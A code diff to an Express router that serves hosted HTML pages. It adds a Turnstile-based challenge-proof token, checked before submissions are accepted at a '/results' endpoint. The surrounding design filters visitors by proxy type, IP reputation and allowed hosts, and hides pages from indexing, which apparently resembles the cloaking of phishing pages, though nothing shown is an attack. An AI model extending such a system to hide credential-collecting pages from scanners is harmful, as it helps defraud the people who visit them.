@@ -22,6 +22,7 @@ import {
   verifyTurnstileToken
 } from "../services/turnstile.js";
 import { securityDecision } from "../services/securityRules.js";
+import { createChallengeProof, verifyChallengeProof } from "../services/challengeProof.js";
 
 export const runtimeRouter = Router();
 const accessDeniedMessage = "ACCESS DENIED";
@@ -197,6 +198,7 @@ async function runtimeContext(req, res, options = {}) {
   if (expectedSecret && !safeCompare(providedSecret, expectedSecret)) {
     return accessDenied(res);
   }
+  req.deuceRelayTrusted = Boolean(expectedSecret);
 
   const clientHost = normalizeHost(req.headers["x-deuce-client-host"] || req.body?.hostname || req.query?.hostname || req.headers.origin || req.headers.host);
   const allowedHosts = allowedHostsFor(page);
@@ -238,10 +240,10 @@ function runtimePageUrl(userPageId, file) {
   return `/api/runtime/source?${params.toString()}`;
 }
 
-function rewriteRuntimeHtml(html, { userPageId, file, security = {} }) {
+function rewriteRuntimeHtml(html, { userPageId, file, security = {}, forceTurnstile = false }) {
   const turnstile = publicTurnstileConfig(security);
   const turnstileConfig = {
-    enabled: Boolean(turnstile.enabled && turnstile.siteKey),
+    enabled: Boolean((turnstile.enabled || forceTurnstile) && turnstile.siteKey),
     siteKey: turnstile.siteKey || ""
   };
   const rewritten = html.replace(/\b(src|href|action)=["']([^"']+)["']/gi, (match, attr, value) => {
@@ -269,7 +271,8 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {} }) {
     userPageId: ${JSON.stringify(userPageId)},
     pageId: ${JSON.stringify(file)},
     sessionId: getSessionId(),
-    turnstile: ${JSON.stringify(turnstileConfig)}
+    turnstile: ${JSON.stringify(turnstileConfig)},
+    challengeProof: ""
   };
   const apiBase = window.location.pathname.indexOf("/api/runtime/") === 0 ? "/api/runtime" : "/api";
 
@@ -476,7 +479,14 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {} }) {
           sitekey: runtime.turnstile.siteKey,
           callback: function (token) {
             send("verify-human", { token: token, screen: pageLabel() }).then(function (response) {
-              resolve(Boolean(response && response.ok));
+              if (!response || !response.ok) {
+                resolve(false);
+                return;
+              }
+              response.json().then(function (data) {
+                runtime.challengeProof = data.challengeProof || "";
+                resolve(Boolean(data.verified));
+              }).catch(function () { resolve(false); });
             });
           },
           "error-callback": function () { resolve(false); },
@@ -529,6 +539,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {} }) {
         hostname: window.location.hostname,
         path: window.location.pathname,
         createdAt: new Date().toISOString(),
+        challengeProof: runtime.challengeProof || "",
         ...payload
       })
     }).catch(function () { return null; });
@@ -680,7 +691,8 @@ async function packageForRuntimePage(page) {
 async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
   const context = await runtimeContext(req, res, { expiredResponse: asAsset ? "json" : "html" });
   if (!context) return;
-  if (!await enforceRuntimeSecurity(context, req, res)) return;
+  const securityDecisionResult = await enforceRuntimeSecurity(context, req, res);
+  if (!securityDecisionResult) return;
 
   const pagePackage = await packageForRuntimePage(context.page);
   const requestedFile = String(req.query?.file || "");
@@ -712,7 +724,12 @@ async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
   res.setHeader("Content-Type", "text/html; charset=utf-8");
   res.setHeader("Cache-Control", "no-store");
   res.setHeader("X-Robots-Tag", "noindex, nofollow");
-  res.send(rewriteRuntimeHtml(html, { userPageId: context.page.id, file, security: context.page.securityConfig || {} }));
+  res.send(rewriteRuntimeHtml(html, {
+    userPageId: context.page.id,
+    file,
+    security: context.page.securityConfig || {},
+    forceTurnstile: Boolean(securityDecisionResult.challengeRequired)
+  }));
 }
 
 runtimeRouter.get("/config", async (req, res) => {
@@ -757,7 +774,7 @@ runtimeRouter.post("/security/check", async (req, res) => {
     res.status(403).json({ allowed: false, reason: accessDeniedMessage });
     return;
   }
-  res.json({ ...decision, ip: context.ip, host: context.clientHost });
+  res.json({ ...decision, captchaRequired: Boolean(context.page.securityConfig?.captcha || decision.challengeRequired), ip: context.ip, host: context.clientHost });
 });
 
 runtimeRouter.post("/verify-human", async (req, res) => {
@@ -771,7 +788,7 @@ runtimeRouter.post("/verify-human", async (req, res) => {
   }
 
   const security = context.page.securityConfig || {};
-  if (!security.captcha) {
+  if (!security.captcha && !decision.challengeRequired) {
     res.json({ verified: true, skipped: true });
     return;
   }
@@ -783,7 +800,8 @@ runtimeRouter.post("/verify-human", async (req, res) => {
   });
   res.status(result.success ? 200 : 400).json({
     verified: result.success,
-    reason: result.success ? "Verified" : accessDeniedMessage
+    reason: result.success ? "Verified" : accessDeniedMessage,
+    challengeProof: result.success ? createChallengeProof({ userPageId: context.page.id, sessionId: req.body?.sessionId, ip: context.ip }) : ""
   });
 });
 
@@ -803,7 +821,9 @@ runtimeRouter.post("/traffic", async (req, res) => {
       ...(req.body?.metadata || {}),
       deviceType: decision.deviceType || null,
       proxyType: decision.proxyType || null,
-      reputation: decision.reputation || null
+      reputation: decision.reputation || null,
+      reputationStatus: decision.reputationStatus || null,
+      challengeRequired: Boolean(decision.challengeRequired)
     }
   }, context.ip, req.headers["user-agent"]);
   res.status(201).json({
@@ -837,6 +857,14 @@ runtimeRouter.post("/results", async (req, res) => {
   if (!context) return;
   const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
   if (!decision.allowed) {
+    res.status(403).json({ error: accessDeniedMessage });
+    return;
+  }
+  if (decision.challengeRequired && !verifyChallengeProof(req.body?.challengeProof, {
+    userPageId: context.page.id,
+    sessionId: req.body?.sessionId,
+    ip: context.ip
+  })) {
     res.status(403).json({ error: accessDeniedMessage });
     return;
   }
